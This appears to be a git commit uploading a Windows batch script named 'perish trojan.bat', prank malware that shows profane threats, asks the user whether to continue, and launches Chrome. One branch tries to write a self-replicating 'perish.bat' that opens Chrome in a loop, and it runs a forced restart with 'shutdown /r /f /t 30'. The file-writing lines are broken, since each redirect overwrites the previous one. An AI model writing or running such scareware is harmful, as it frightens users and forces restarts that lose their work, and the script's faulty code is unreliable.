2ab439aab53fe4d1eedc360b10b502aa279342f2
polartest127 <eieieiimonvacation2@gmail.com>
2026-02-14 19:41:01 +0000

    Add files via upload

---
+++ perish trojan.bat
@@ -0,0 +1,54 @@
+@echo off
+color 04
+echo YOUR COMPUTER HAS BEEN FUCKED BY THE PERISH TROJAN
+pause
+
+echo Do you wanna face it? (yes/no)
+set /p input=Type yes to continue: 
+
+if /i "%input%"=="yes" goto yes
+if /i "%input%"=="no" goto no
+
+echo Invalid response. Exiting...
+pause
+exit
+
+:yes
+rem Launch Chrome
+start chrome
+exit
+
+:no
+echo Are you for real rn?
+pause
+echo You're still getting your PC fucked.
+pause
+start
+echo ONE LAST CHANCE, would you like to fuck your pc?
+pause
+set /p input=Type yes to continue: 
+if /i "%input%"=="yes" goto yes2
+if /i "%input%"=="no" goto no2
+
+:yes2
+echo YOUR COMPUTER IS FUCKED NOW EZ
+pause
+echo ^@echo off > perish.bat
+echo echo YOUR COMPUTER HAS BEEN FUCKED BY THIS MALWARE! GOOD LUCK GETTIN YOUR PC BACK. > perish.bat
+echo :loop > perish.bat
+echo start Chrome.exe > perish.bat
+echo start Chrome.exe > perish.bat
+echo start Chrome.exe > perish.bat
+echo start Chrome.exe > perish.bat
+echo start Chrome.exe > perish.bat
+echo start Chrome.exe > perish.bat
+echo start Chrome.exe > perish.bat
+
+   
+echo pause > perish.bat
+pause > perish.bat
+shutdown /r /f /t 30 > perish.bat
+echo pause >> perish.bat
+
+exit
+
